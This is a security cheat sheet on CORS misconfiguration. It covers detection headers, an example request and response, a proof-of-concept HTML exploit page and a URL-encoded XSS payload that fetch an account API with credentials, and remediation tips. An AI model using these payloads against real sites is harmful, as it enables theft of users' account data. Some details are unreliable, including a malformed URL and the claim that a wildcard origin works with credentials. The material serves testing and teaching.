# CORS

## Information

Cross-Origin Resource Sharing(CORS) is a mechanism that enables web browsers to perform cross-domain requests using the XMLHttpRequest API in a controlled manner.

Without CORS, websites are restricted to accessing resources from the same origin through what is known as ***same-origin policy***

OWASP TOP 10: A6-Security Misconfiguration vulnerability

## Detect CORS misconfiguration     

Identify Response **Access-Control-Allow-Origin** Header 

1. CORS misconfiguration using wildcards such as (*)
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: * 
```
2. Origin with Other Domain.
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: vulnerablesite.com 
```

**Example:** Web client sends a request to get a resource from a different domain, Consider the below Request
A browser initiates AJAX request GET `https:///api.account_detaild`  request to `api.website.com` containing the domain that served the parent page
```
GET /api/account_detaild HTTP/1.1
Host: www.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: www.website.com

```
The web client inform to server its source domain using the HTTP request header "Origin". 

You get below response with the **Access-Control-Allow-Origin** header setting. 
```
HTTP/1.1 200 OK
Date: Sat, 16 May 2020 00:2:03 GMT
Content-Type: application/xml
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: * 
```
The header is configured with a wildcard **(*)**. It means **Any domain** can access the resources.

If we get response with the **Access-Control-Allow-Origin: www.website.com** It means only "www.website.com" can access the resources

## POC - Exploite Code
1. cors.html is the exploit code to exploit misconfigured CORS

```javascript
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("emo").innerHTML = alert(this.responseText);
            }
         };
         xhttp.open("GET", "https://www.website.com/api/account_detaild", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS - POC Exploit </h2>
      <button type="button" onclick="cors()">Exploit CORS</button>
   </body>
</html>
```

2. You can exploit this misconfiguration CORS using XSS so just replace **payload alert(document.domain)** 
    
    - XSS Payload for Exploite CORS:
```javascript
<script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200)alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.website.com/api/account_detaild",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
```


## Remediation

* Allow only **Trusted domains** `Access-Control-Allow-Origin: <origin>` header.
  E.x: Access-Control-Allow-Origin: https://website.com

* Avoid whitelisting null `Access-Control-Allow-Origin: null`

* CORS defines browser behaviors and is never a replacing for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data such as authentication and session management, in addition to properly configured CORS

## Refrence

- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

- https://hackerone.com/reports/470298 

- https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397
